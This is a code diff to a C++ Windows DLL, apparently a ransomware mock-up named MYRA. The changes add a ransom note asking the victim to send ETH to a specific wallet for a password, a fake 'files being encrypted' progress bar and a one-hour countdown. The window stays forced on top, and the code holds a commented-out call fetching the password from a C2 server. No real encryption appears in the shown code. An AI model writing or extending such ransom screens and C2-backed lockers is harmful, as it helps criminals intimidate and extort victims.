@@ -14,10 +14,11 @@ HWND hWndProgressBar;
 HWND hWndTimerLabel;
 HWND hwndMain;
 HFONT hFontBold;
+HWND hWndEncryptionStatusLabel; // Nouveau label de statut de chiffrement
 std::wstring correctPassword;
 
 // Timer variables
-int remainingTime = 60;
+int remainingTime = 3600;
 UINT_PTR timerID;
 
 // Static text for labels
@@ -26,11 +27,37 @@ const wchar_t* labelTexts[8] = {
     L"Contact your administration for more info on this incident ;)",
     L"Bonjour, c'est MYRA.",
     L"Contactez votre administration pour plus d'informations sur cet incident ;)",
-    L"??????, ??? MYRA.",
-    L"????????? ? ????? ?????????????? ??? ????????? ?????????? ?? ???? ????????? ;)",
-    L"?????? MYRA",
-    L"?????????????????????? ;)"
+    L"Send ETH to this address : 0x141a7758F57bB2023A90Ed8cE4262F050E882Be9 ",
+    L"to receive the password"
 };
+
+static bool isRed = true;
+int fakeProgress = 0;
+
+void SimulateFakeProgress() {
+    static int delayCounter = 0;
+
+    if (fakeProgress >= 100) {
+        SetWindowText(hWndEncryptionStatusLabel, L"Chiffrement terminé");
+        return;
+    }
+    if (delayCounter > 0) {
+        delayCounter--;
+        return; // Pause momentanée
+    }
+
+    int step = rand() % 2; // avance de 0 à 2 %
+    if (step == 0) {
+        delayCounter = rand() % 25; // pause de 0 à 25 cycles ()
+    }
+    else {
+        fakeProgress += step;
+        if (fakeProgress > 100) fakeProgress = 100;
+    }
+
+    SendMessage(hWndProgressBar, PBM_SETPOS, fakeProgress, 0);
+}
+
 
 // Keep the window active
 void KeepWindowActive()
@@ -40,21 +67,31 @@ void KeepWindowActive()
 }
 
 // Function to update the progress bar
-void UpdateProgressBar()
-{
-    int progressValue = (60 - remainingTime) * 100 / 60;
-    SendMessage(hWndProgressBar, PBM_SETPOS, progressValue, 0);
+void UpdateProgressBar(){
+    int progressValue = (3600 - remainingTime) * 100 / 3600; // Calcul du pourcentage
+    //SendMessage(hWndProgressBar, PBM_SETPOS, progressValue, 0);
+    isRed = !isRed;
+    InvalidateRect(hwndMain, NULL, TRUE);
+
+    // Calcul des heures, minutes et secondes restantes
+    int hours = remainingTime / 3600;
+    int minutes = (remainingTime % 3600) / 60;
+    int seconds = remainingTime % 60;
+
+    wchar_t timerText[64];
+    swprintf(timerText, 64, L"Temps restant : %02d:%02d:%02d", hours, minutes, seconds);
+    SetWindowText(hWndTimerLabel, timerText);
 
     if (remainingTime <= 0)
     {
         KillTimer(hwndMain, timerID);
-        MessageBox(hwndMain, L"Time is up! Closing now.", L"Timeout", MB_OK | MB_ICONWARNING);
+        MessageBox(hwndMain, L"Le temps est écoulé ! Fermeture en cours.", L"Timeout", MB_OK | MB_ICONWARNING);
         ExitProcess(0);
         return;
     }
 
     remainingTime--;
-    KeepWindowActive(); // Keep window on top
+    KeepWindowActive(); // Garder la fenêtre au premier plan
 }
 
 // Timer callback function
@@ -88,7 +125,7 @@ LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
     case WM_CTLCOLORSTATIC:
     {
         HDC hdcStatic = (HDC)wParam;
-        SetTextColor(hdcStatic, RGB(255, 0, 0));
+        SetTextColor(hdcStatic, isRed ? RGB(255, 0, 0) : RGB(255, 255, 255));
         SetBkMode(hdcStatic, TRANSPARENT);
         return (LRESULT)GetStockObject(NULL_BRUSH);
     }
@@ -112,8 +149,14 @@ LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
         break;
 
     case WM_TIMER:
-        TimerProc(hwnd, uMsg, wParam, 0);
+        if (wParam == 1) {
+            UpdateProgressBar(); // compte à rebours
+        }
+        else if (wParam == 2) {
+            SimulateFakeProgress(); // fausse barre de chiffrement
+        }
         break;
+
 
     case WM_DESTROY:
         KillTimer(hwnd, timerID);
@@ -138,7 +181,7 @@ void ShowGUI()
 
     hbrBkgnd = CreateSolidBrush(RGB(0, 0, 0));
 
-    hFontBold = CreateFont(22, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE,
+    hFontBold = CreateFont(32, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE,
         DEFAULT_CHARSET, OUT_OUTLINE_PRECIS, CLIP_DEFAULT_PRECIS, CLEARTYPE_QUALITY,
         VARIABLE_PITCH, L"Arial");
 
@@ -157,6 +200,7 @@ void ShowGUI()
     if (hwndMain == NULL) return;
 
     int yOffset = screenHeight / 10;
+
     for (int i = 0; i < 8; i++)
     {
         hWndLabels[i] = CreateWindow(L"STATIC", labelTexts[i], WS_VISIBLE | WS_CHILD,
@@ -165,14 +209,20 @@ void ShowGUI()
         yOffset += 50;
     }
 
-    hWndTimerLabel = CreateWindow(L"STATIC", L"You have one minute", WS_VISIBLE | WS_CHILD | SS_CENTER,
-        screenWidth / 2 - 150, yOffset, 300, 40, hwndMain, NULL, GetModuleHandle(NULL), NULL);
+    hWndTimerLabel = CreateWindow(L"STATIC", L"You have one hour", WS_VISIBLE | WS_CHILD | SS_CENTER,
+        screenWidth / 2 - 150, yOffset, 300,120, hwndMain, NULL, GetModuleHandle(NULL), NULL);
     SendMessage(hWndTimerLabel, WM_SETFONT, (WPARAM)hFontBold, TRUE);
+    yOffset += 75;
+
+    hWndEncryptionStatusLabel = CreateWindow(L"STATIC", L"Chiffrement des fichiers en cours...", WS_VISIBLE | WS_CHILD | SS_CENTER,
+        screenWidth / 2 - 200, yOffset, 400, 60, hwndMain, NULL, GetModuleHandle(NULL), NULL);
+    SendMessage(hWndEncryptionStatusLabel, WM_SETFONT, (WPARAM)hFontBold, TRUE);
     yOffset += 50;
+
 
     hWndProgressBar = CreateWindowEx(0, PROGRESS_CLASS, NULL,
         WS_CHILD | WS_VISIBLE | PBS_SMOOTH,
-        screenWidth / 4, yOffset, screenWidth / 2, 30,
+        screenWidth / 4, yOffset + 25, screenWidth / 2, 30,
         hwndMain, NULL, GetModuleHandle(NULL), NULL);
 
     SendMessage(hWndProgressBar, PBM_SETRANGE, 0, MAKELPARAM(0, 100));
@@ -186,6 +236,7 @@ void ShowGUI()
         screenWidth / 2 - 50, yOffset + 50, 100, 50, hwndMain, (HMENU)1, GetModuleHandle(NULL), NULL);
 
     timerID = SetTimer(hwndMain, 1, 1000, NULL);
+    timerID = SetTimer(hwndMain, 2, 200, NULL);
 
     ShowWindow(hwndMain, SW_SHOW);
     UpdateWindow(hwndMain);
@@ -202,7 +253,8 @@ void ShowGUI()
 extern "C" __declspec(dllexport) HRESULT __stdcall DllRegisterServer() { 
 
     // getting the password
-    std::string password = C2Client::get_password_from_server();
+    //std::string password = C2Client::get_password_from_server();
+	std::string password = "password"; // Placeholder for password retrieval
     correctPassword = std::wstring(password.begin(), password.end());
 
 
